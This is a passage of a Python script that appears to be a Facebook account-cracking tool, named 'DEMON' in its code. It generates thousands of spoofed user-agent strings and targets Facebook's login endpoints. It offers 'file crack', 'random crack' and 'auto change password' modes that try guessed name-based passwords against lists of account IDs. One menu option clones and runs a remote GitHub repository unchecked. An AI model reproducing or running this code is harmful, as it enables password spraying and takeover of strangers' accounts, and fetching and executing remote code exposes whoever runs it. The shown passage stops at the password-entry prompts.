AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 11; RMX2050) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 11; RMX2061 Build/RKQ1.201112.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.24 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; RMX3396 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.76 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 12; zh-CN; RMX3161 Build/RKQ1.211103.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.58 UCBrowser/15.3.6.1226 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; RMX3191 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.79 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 11; RMX2101 Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.162 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 11; Infinix X698 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 11; Infinix X698) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; Infinix X670) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 8.1.0; Infinix X624B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36"])
	return ua
	
def iAmMethod8Ua():
    ios_version = random.choice(["10_0_2","10_1_1","10_2","10_2_1","10_3_1","10_3_2","10_3_3"])
    END = "[FBAN/FBIOS;FBAV/{str(random.randint(111,999))+'.0.0.'+str(random.randrange(1,30))+'.'+str(random.randint(111,999))};FBBV/{FBBV};FBDV/iPhone10,{random.choice(['1','5'])};FBMD/iPhone;FBSN/iOS;FBSV/{(ios_version).replace('_','.')};FBSS/2;FBCR/{random.choice(['Airtel NG','MTN NG'])};FBID/phone;FBLC/{random.choice(['en_US','en_GB'])};FBOP/5;FBRV/{random.choice(['106631002','0'])}]"
    ua = random.choice(["Mozilla/5.0 (Linux; Android 10; LM-Q710(FGN)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.111 Mobile Safari/537.36"+"Mozilla/5.0 (Linux; Android 10; HD1913) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.111 Mobile Safari/537.36 EdgA/118.0.2088.58"+"Mozilla/5.0 (Windows Mobile 10; Android 10.0; Microsoft; Lumia 950XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36 Edge/40.15254.603"+"Mozilla/5.0 (Android 14; Mobile; rv:109.0) Gecko/119.0 Firefox/119.0"+"Mozilla/5.0 (Android 14; Mobile; LG-M255; rv:119.0) Gecko/119.0 Firefox/119.0"+"Mozilla/5.0 (Linux; Android 10; VOG-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.111 Mobile Safari/537.36 OPR/76.2.4027.73374"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:115.0) Gecko/20100101 Firefox/115.0"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 OPR/104.0.0.0"+"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"+"Mozilla/5.0 (X11; Linux i686; rv:109.0) Gecko/20100101 Firefox/119.0"+"Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0"+"Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:109.0) Gecko/20100101 Firefox/119.0"+"Mozilla/5.0 (X11; Linux i686; rv:115.0) Gecko/20100101 Firefox/115.0"+"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 OPR/104.0.0.0"+"Mozilla/5.0 (iPad; CPU OS 14_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/119.0 Mobile/15E148 Safari/605.1.15"+"Mozilla/5.0 (iPad; CPU OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1"+"Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/119.0.6045.41 Mobile/15E148 Safari/604.1"+"Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 EdgiOS/118.2088.68 Mobile/15E148 Safari/605.1.15"+"Mozilla/5.0 (iPhone; CPU iPhone OS 14_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/119.0 Mobile/15E148 Safari/605.1.15"+"Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 Edg/118.0.2088.69"+"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0"+"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.1"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.3"+"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15"+"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119."+"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.1"+"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.3"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 Edg/118.0.2088.76"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 Edg/118.0.2088.61"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119."+"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0"+"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36"+"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 Edg/92.0.902.67"+"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 Edg/118.0.2088.69"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117."+"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/118.0"+"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36 Edg/100.0.1185.39"+"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.3"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 OPR/103.0.0."+"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36"+"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15"+"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 Edg/118.0.2088.46"+"Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 OPR/103.0.0.0"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 Edg/118.0.2088.6"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 OPR/102.0.0.0"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 OPR/102.0.0."+"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 OPR/95.0.0."+"Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0"+"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0"+"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 OPR/103.0.0.0"+"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.47"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.60"+"Mozilla/5.0 (X11; CrOS aarch64 13597.84.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.102 Safari/537.36"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"+"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.936 YaBrowser/23.9.3.936 Yowser/2.5 Safari/537.36"+"Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/116.0"+"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/118.0"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 Edg/113.0.1774.57"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.58"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.31"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36 Edg/86.0.622.38"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 Edg/118.0.2088.57"+"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 OPR/104.0.0.0"+"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36"+"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36"+"Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.0 Safari/537.36"+"Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0 SeaMonkey/2.53.10.2"+"Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/117.0"+"Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"+"Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"+"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0"+"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0"+"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"+"Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/117.0"+"Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 GLS/90.10.1589.90"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.36"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.933 YaBrowser/23.9.3.933 Yowser/2.5 Safari/537.36"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edg/116.0.1938.81"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edg/116.0.1938.69"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edg/116.0.1938.62"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.54"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36",])+END
    return ua
	
ugen1 = []
for t in range(10000):
	a=random.choice(["9.1.5","5.1.6","4.0.1","3.0.1","4.0.2","5.0.2","6.0.1","6.2.2","7.0.1","7.1.0","8.1.0","4.4.4","5.6.1","6.1.3"])
	b=random.randrange(111111,210000)
	c=random.randrange(73,110)
	d=random.randrange(33300,88800)
	e=random.randrange(40,250)
	z=random.randrange(43,120)
	h=random.randrange(11,19)
	g=random.choice(['OPM1','TP1A','RP1A','PPR1','PKQ1','QP1A','SP1A','RKQ1'])
	i=random.choice(['en-US','en-GB','id-ID','de-DE','ru-RU','en-SG','fr-FR','fa-IR','ja-JP','pt-BR','cs-CZ','zh-HK','zh-CN','vi-VN','en-PH','en-IN','tr-TR'])
	ii=random.choice(['en','id','de','ru','en','fr','fa','ja','pt','cs','zh','zh','vi','tr'])
	oppo=random.choice(['CPH2437','CPH2351','CPH2048','CPH2389','CPH2359','CPH2363','CPH2211','PGX110','CPH1917'])
	oppo2 = random.choice(["PBDM00","PAHM00","PCDM10","PCAT00","PCDM10","PCHM30","PCKM00","PCHM10"])
	rilmi= random.choice(["RMX3516","RMX3371","RMX3461","RMX3286","RMX3561","RMX3388","RMX3311","RMX3142","RMX2071","RMX1805","RMX1809","RMX1801","RMX1807","RMX1803","RMX1825","RMX1821","RMX1822","RMX1833","RMX1851","RMX1853","RMX1827","RMX1911","RMX1919","RMX1927","RMX1971","RMX1973","RMX2030","RMX2032","RMX1925","RMX1929","RMX2001","RMX2061","RMX2063","RMX2040","RMX2042","RMX2002","RMX2151","RMX2163","RMX2155","RMX2170","RMX2103","RMX3085","RMX3241","RMX3081","RMX3151","RMX3381","RMX3521","RMX3474","RMX3471","RMX3472","RMX3392","RMX3393","RMX3491","RMX1811","RMX2185","RMX3231","RMX2189","RMX2180","RMX2195","RMX2101","RMX1941","RMX1945","RMX3063","RMX3061","RMX3201","RMX3203","RMX3261","RMX3263","RMX3193","RMX3191","RMX3195","RMX3197","RMX3265","RMX3268","RMX3269","RMX2027","RMX2020","RMX2021","RMX3581","RMX3501","RMX3503","RMX3511","RMX3310","RMX3312","RMX3551","RMX3301","RMX3300","RMX2202","RMX3363","RMX3360","RMX3366","RMX3361","RMX3031","RMX3370","RMX3357","RMX3560","RMX3562","RMX3350","RMX2193","RMX2161","RMX2050","RMX2156","RMX3242","RMX3171","RMX3430","RMX3235","RMX3506","RMX2117","RMX2173","RMX3161","RMX2205","RMX3462","RMX3478","RMX3372","RMX3574","RMX1831","RMX3121","RMX3122","RMX3125","RMX3043","RMX3042","RMX3041","RMX3092","RMX3093","RMX3571","RMX3475","RMX2200","RMX2201","RMX2111","RMX2112","RMX1901","RMX1903","RMX1992","RMX1993","RMX1991","RMX1931","RMX2142","RMX2081","RMX2085","RMX2083","RMX2086","RMX2144","RMX2051","RMX2025","RMX2075","RMX2076","RMX2072","RMX2052","RMX2176","RMX2121","RMX3115","RMX1921"])
	redmi = random.choice(["2201116SI","M2012K11AI","22011119TI","21091116UI","M2102K1AC","M2012K11I","22041219I","22041216I","2203121C","2106118C","2201123G","2203129G","2201122G","2201122C","2206122SC","22081212C","2112123AG","2112123AC","2109119BC","M2002J9G","M2007J1SC","M2007J17I","M2102J2SC","M2007J3SY","M2007J17G","M2007J3SG","M2011K2G","M2101K9AG","M2101K9R","2109119DG","M2101K9G","2109119DI","M2012K11G","M2102K1G","21081111RG","2107113SG","21051182G","M2105K81AC","M2105K81C","21061119DG","21121119SG","22011119UY","21061119AG","21061119AL","22041219NY","22041219G","21061119BI","220233L2G","220233L2I","220333QNY","220333QAG","M2004J7AC","M2004J7BC","M2004J19C","M2006C3MII","M2010J19SI","M2006C3LG","M2006C3LVG","M2006C3MG","M2006C3MT","M2006C3MNG","M2006C3LII","M2010J19SL","M2010J19SG","M2010J19SY","M2012K11AC","M2012K10C"])
	model = random.choice(["EdgA/41.1.35.1","EdgA/94.0.992.50","EdgA/98.0.1108.62","EdgA/114.0.1823.61","EdgA/111.0.1661.59"])
	iphone = random.choice(["11_2","11_1","11_1_1","15_6","11_1_3","11_3_2","11_2_1","11_2","13_2_1","14_2_1","15_1_1","12_1_1","12_1","12_1_2","12_2_1","16_1","16_2","13_3","13_1_1","13_2_1","14_3_5","9_1","8_1","7_1","10_1","9_1_1","8_1_1","9_2_1","8_2_2","15_3_2"])
	iphone1 = random.choice(["605.1.15","602.1.50","605.1.10","604.1.50","602.2.14","602.3.12","602.4.6","603.1.30","603.2.4","603.3.8","601.1.46"])
	iphone2 = random.choice(["7B367","15E148","11A465","10B350","11A4449d","10B329","7B500","11B554a","13E233","13F69","13E238","9B206","9A334","11B651","11D167","8C148","8K2","7B314","10a523","8C148","8J2","1A543","12A405","8L1","8F190","8C148","8G4","8A293","8B117","19G82","15E148","18F72","20G75"])
	opera = random.choice(["SAMSUNG-GT-C3590","SAMSUNG-GT-C3312","SAMSUNG-GT-E2202","SAMSUNG-GT-S3802","SAMSUNG-GT-C3262","SAMSUNG-GT-E1282T","SAMSUNG-GT-E2252"])
	#zax1=f'Mozilla/5.0 (Linux; Android {a}; {redmi}){rilmi}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{c}.0.0.0 Mobile Safari/537.36'
	zax2=f'Mozilla/5.0 (Linux; Android {a}; {oppo}){oppo2}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{z}.0.0.0 Mobile Safari/537.36'
	zax3=f'Opera/9.80 (J2ME/MIDP; Opera Mini/{a}.{d}/{z}.{e}; U; {i}) Presto/2.12.423 Version/12.16'
	#zax4=f'{opera} Opera/9.80 (J2ME/MIDP; Opera Mini/{a}.{d}/{z}.{e}; U; {i}) Presto/2.12.423 Version/12.16'
	zax5=f'Mozilla/5.0 (Linux; Android {a}; {oppo}) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/{z}.0.0.0 Mobile Safari/537.36'
	zax6 = f'Mozilla/5.0 (iPhone; CPU iPhone OS {iphone} like Mac OS X) AppleWebKit/{iphone1} (KHTML, like Gecko) Version/{h}.0.{a} Mobile Mobile/{iphone2} Safari/60{h}.1'
	zax7=f'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{z}.0.0.0 Mobile Safari/537.36'
	main_ua = random.choice([zax5,zax2,zax6,zax3,zax7])
	ugen1.append(main_ua)
	
ugen=[]
for manu in range(1000):
	rr,rc=random.randint,random.choice
	k1 = (f"{str(rr(7,13))}")
	k2 = (f"{str(rr(94,117))}.0.{str(rr(5000,5999))}.{str(rr(0,299))}")
	fbav = (f"{str(rr(100,900))}.0.0.{str(rr(10,999))}.{str(rr(10,90))}")
	ua_K = f"Mozilla/5.0 (Linux; Android {k1}; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{k2} Mobile Safari/537.36"
	Genjutsu = str(rc([ua_K]))
	ugen.append(Genjutsu)
	
nid = ''.join((random.choice(['A','a','B','b','c','C','d','D','e','E','F','f','G','g','h','H','i','I','j','J','k','K','l','L','m','M','N','n','o','O','p','P','q','Q','r','R','s','S','t','T','u','U','v','V','w','W','x','X','y','Y','z','Z']) for i in range(12)))
tid = str(random.randint(111,999))
class DEMON:
	
	def __init__(self):

		self.gp = "https://b-graph.facebook.com/auth/login"
		self.ap = "https://b-api.facebook.com/auth/login"
	def DEMON(self):
		#heck_again()
		logo()

		p(" [1] \033[1;37mFILE CRACK ")
		p(" [2] \033[1;37mCREATE FILE (WORKING) ")
		p(" [3] \033[1;37mSEPARATE LINKS/IDS  ")
		p(" [4] \033[1;37mRANDOM CRACK ")
		p(" [5] \033[1;37mREMOVE DOUBLE  LINKS ")
		p(" [6] \033[1;37mJOIN US ON FACEBOOK ")
		p(" [7] \033[1;37mJOIN US ON WHATSAPP ")
		p(" [9] \033[1;37mREMOVE USED  LINKS ")
		p(" [10] \033[1;37mAUTO CHANGE PASSWORD ")
		p(" [E] \033[1;37mEXIT BACK ")
		line()
		opt1 = input(" [•] Select An Option : ")
		if opt1 == "1":self.file_menu()
		elif opt1 == "2":self.dump_menu()
		elif opt1 == "3":Grep().with_names()
		elif opt1 == "4":self.Main_Menu()
			#llb = f"/data/data/com.termux/files/usr/tmp/.*"
			#os.system(f'rm -rf {llb}')
		elif opt1 == "5":Grep().remove_links()
		elif opt1 == "6":Join().Facebook()
		elif opt1 == "7":Join().Whatsapp()
		elif opt1 == "8":Server().report()
		elif opt1 == "9":automation().used_cutter()
		elif opt1 == "10":automation().iAmPasswordManager()
		elif opt1 == "E":exit(" [•] Good Bye !!!!!!! ")
		else:p(" [•] Wrong Select ");sp(2);self.DEMON()
	
	
	def dump_menu(self):
		os.system("cd && git clone https://github.com/dilutecodes/file")
		os.system('cd && cd file ;python file')
	def file_menu(self):
		#check_again()
		logo()
		p(" [•] \033[1;37mExample /sdcard/filename.txt")
		file = input(" [•] \033[1;37mPut File Path : ")
		try:
			id = open(file,"r").read().splitlines()
			self.method_select(id)
		except FileNotFoundError:
			p(" [•] File Path Incorrect ")
			sp(2);self.file_menu()
	def method_select(self,id):
		#check_again()
		logo()
		p(" [1] \033[1;37mMethod [1] <new🔥ids>")
		p (" [2] \033[1;37mMethod [2] <new ids>")
		p (" [3] \033[1;37mMethod [3] <updated>")
		p (" [4] \033[1;37mMethod [4] <old/new ids>")
		p (" [5] \033[1;37mMethod [5] <Best🔥>")
		p (" [6] \033[1;37mMethod [6] <Validate mix ids>")
		p (" [7] \033[1;37mMethod [7] <TikTok Method>")
		p (" [8] \033[1;37mMethod [8] <Older ids>")
		line()
		m_opt = input(" [•] Choose : ")
		if m_opt =='1':
			method.append("i")
			self.password_menu(id)
		if m_opt =="2":
			method.append('ii')
			self.password_menu(id)
		if m_opt =="3":
			method.append('iii')
			self.password_menu(id)
		if m_opt =="4":
			method.append('iiii')
			self.password_menu(id)
		elif m_opt =="5":
			method.append('v')
			self.password_menu(id)
		elif m_opt =="6":
			method.append('vi')
			self.password_menu(id)
		elif m_opt =="7":
			method.append('vii')
			self.password_menu(id)
		elif m_opt =="8":
			method.append('viii')
			self.password_menu(id)
		else:p(" [•] Wrong Select ! ");sp(3);self.method_select(id)

	def password_menu(self,id):
		#check_again()
		pwx=[]
		logo()
		max = 70
		p(" [•] Example 1 , 2 , 3  to 10 to 50Max ")
		try:
			plimit = int(input(" [•] Put limit : "))
			if plimit =="":
				plimit = 4
			elif plimit > max:
				p(" [•] Password Limit Should under 50 ");sp(3);self.password_menu()
		except:
			plimit = 4
		logo()
		p(" [•] Enter Your Passwords like : first last, firstlast ,first123 ,first1234 ,first12345 ,first@123, first@1 ,first122, first4321, first2020, last1 ,name ,Names ,first@gmail.com ,firstlast@gmail.com ,last1234, First, First12 ,First Last123 etc ")
		line()
		for n in range(plimit):
			pwx.append(input(" [•] Put Password %s : "%(n+1)))
